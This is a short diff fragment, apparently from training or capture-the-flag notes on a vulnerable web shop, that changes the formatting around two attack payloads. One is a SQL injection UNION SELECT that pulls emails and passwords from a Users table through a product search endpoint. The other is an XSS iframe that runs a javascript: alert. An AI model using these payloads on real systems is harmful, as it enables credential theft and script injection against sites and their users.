@@ -1,7 +1,7 @@
-'''
+´´
 /rest/products/search?q=qwert')) UNION SELECT id, email, password,
 '4', '5', '6', '7', '8', '9' FROM Users--
-'''
-'''
+´´´
+´´´
 <iframe src="javascript:alert('Hacked!')">
-'''
+´´´
